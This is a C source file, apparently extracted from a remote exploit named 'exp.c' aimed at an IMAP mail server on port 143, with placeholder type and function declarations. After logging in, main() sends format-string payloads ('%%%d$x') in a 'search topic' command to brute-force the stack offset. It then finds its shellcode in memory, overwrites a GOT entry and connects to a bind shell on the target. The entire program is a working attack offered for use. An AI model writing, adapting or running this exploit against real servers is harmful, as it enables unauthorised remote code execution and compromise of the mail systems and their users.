#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  unsigned int u_int ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {unsigned short sin_port; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EOF ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int /*<<< orphan*/  EXIT_SUCCESS ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  ISIP (char*) ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int atoi (scalar_t__) ; 
 int /*<<< orphan*/  buildstring (int /*<<< orphan*/ ,unsigned int,int,int) ; 
 int /*<<< orphan*/  clean (char*) ; 
 int /*<<< orphan*/  close (int) ; 
 char* code ; 
 scalar_t__ comun (char*,struct sockaddr_in) ; 
 scalar_t__ connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  free (char*) ; 
 struct hostent* gethostbyname (char*) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  got_entry ; 
 scalar_t__ htons (int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 scalar_t__ inet_ntoa (TYPE_1__) ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  memcpy (TYPE_1__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ optarg ; 
 scalar_t__ read (int,char*,int) ; 
 int /*<<< orphan*/  send_message (int,char*,...) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ strchr (char*,int) ; 
 scalar_t__ strdup (scalar_t__) ; 
 int strlen (char*) ; 
 scalar_t__ strncmp (char*,char*,int) ; 
 char* strstr (char*,char*) ; 
 int /*<<< orphan*/  usage (int,char**) ; 
 int /*<<< orphan*/  welcome () ; 

int main( int argc, char **argv )
{
  struct  hostent    *hp;
  struct sockaddr_in sin4;
  char shellbuf[1030];
  char *host, buffer[512], *ptr, *p, *USER, *PASS;
  int ch, port = 0, sock, offset = 1;
  int login  = 0, i, calc = 0;
  int ret = 0, len  = 0, b;
  int have_shell_loc = 0;
  unsigned int shell_addr = (u_int)0x0806c000;

  welcome( );

  if ( argc < 9 )
  { 
    usage(argc, argv);
    exit(EXIT_SUCCESS);
  }

  if (!(host = malloc (128)))
  {
    fprintf(stderr, "exp.c:115 Could not allocate memory\n");
    exit(EXIT_FAILURE);
  }


  while((ch = getopt(argc, argv, "h:p:l:a:")) != EOF) 
  {
   switch(ch) 
   {
      case 'h':
      host = (char *)strdup(optarg);
      break;

      case 'V':
      break;

      case 'p':
      port =  atoi (optarg);
      break;
 
      case 'l':
      USER = (char *)optarg;
      break;

      case 'a':
      PASS = (char *)optarg;
      break;

      default:
      usage(argc, argv);
      break;
 }	
}


 
  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
  {
    fprintf(stderr, "exp.c:139 Error creating an new socket"); 
    exit(EXIT_FAILURE);
  }

  host = (host) ? host : "localhost";
  port = (port) ? port : 143;

  if (!(ISIP(host)))
  {
     if (!(hp = gethostbyname(host)))
     {
       fprintf(stderr, "exp.c:152 Could not resolve ip address\n");	
       exit(EXIT_FAILURE);
     } 

     memcpy(&sin4.sin_addr,hp->h_addr,hp->h_length);
     host = (char *)strdup(inet_ntoa(sin4.sin_addr)); 
  } else 
    sin4.sin_addr.s_addr = inet_addr(host);

 


  sin4.sin_family = AF_INET;
  sin4.sin_port = (unsigned short)htons( port );

  fprintf(stdout, "[+] Connecting to %s:%d\n", host,port);

  if ((connect(sock, (struct sockaddr *)&sin4,sizeof(struct sockaddr))) < 0)
  { 
     fprintf(stderr, "[*] exp.c:178 Connection failed\n");
     exit(EXIT_FAILURE);
  }


  fprintf(stdout, "[+] Connected .. \n");
  fprintf(stdout, "[+] Sending login ... \n");

  send_message(sock, "1 LOGIN %s %s\r\n", USER, PASS);
  fprintf(stdout, "[+] Done ... \n");

  while ((read(sock, buffer, 512)) > 0)
  {
    if ( login == 0  && ret == 0)
    switch (buffer[0])
    {

     case '1':
     fprintf(stdout, "[+] Selecting inbox ..\n");
     send_message(sock, "2 Select inbox\n");
     fprintf(stdout, "[+] Selecting Done .. Starting brute sequence\n");
     send_message(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
     login = 1;
     break;
    }


    if ((ptr=strstr(buffer, "(near")) && login == 1)
    {
      ptr +=15;
      if ((strncmp(ptr, "41414141",8))!=0) 
      {
        offset ++;
        send_message(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
      }
      else 
      {
        fprintf(stdout, "[+] Found offset %d\n", offset);
	fprintf(stdout, "[+] Finding buffer on the stack\n");
	ret = 1;
	login = 0;
        clean(buffer);
      }
    } 

    if ( ret == 1 )
    {
	
      if ((ptr=strstr(buffer, "(near"))) 
      {
        ptr +=6+4 +1; /* +4 for the addr string*/
	/* +1 for the junk char */
	calc = strlen(buffer) - strlen(ptr);
	calc -=6+4+1;	
	
	for (i = 0; i < strlen(buffer); i++) 
        {  
           if ( (strncmp(ptr, code, strlen(code)))==0 && have_shell_loc !=1)
           {
	     shell_addr += i -4;
	     have_shell_loc = 1;
	     sleep(2);
             buildstring(got_entry, shell_addr+=3, offset, sock);
             fprintf(stdout,"[+] Decoy found at %p\n", shell_addr);
       	     close(sock);
	     fprintf(stdout, "[+] Trying to contact the bind shell ..\n");
    	     if((comun(host, sin4)) < 0)
	       fprintf(stderr, "[-] Exploit failed\n");
           } 
           else
             ++ptr;
        } 
      }      
      if( shell_addr > 0xc0000000)
        break;
      shell_addr++;
      ptr = ((char *)&shell_addr);
      ptr[4] = 0;
      if ( strchr(ptr, 0xa) || strchr(ptr, 0xd) || ptr[0]==0x00) 
      {
        shell_addr ++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      } 
      while (strlen(ptr) !=4)
      {
        shell_addr++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      }
      if (have_shell_loc != 1)
      {
        send_message(sock, "3 search topic .%s....%%%d$s%sCCCC\n",ptr,offset,code);
      }
    }
    clean(buffer);
  }

  fprintf(stderr, "[+] Closing connection\n");
  close(sock);
  free(host);

  fprintf(stderr, "[-] Exploit failed %p\n", shell_addr);
  return 0;
}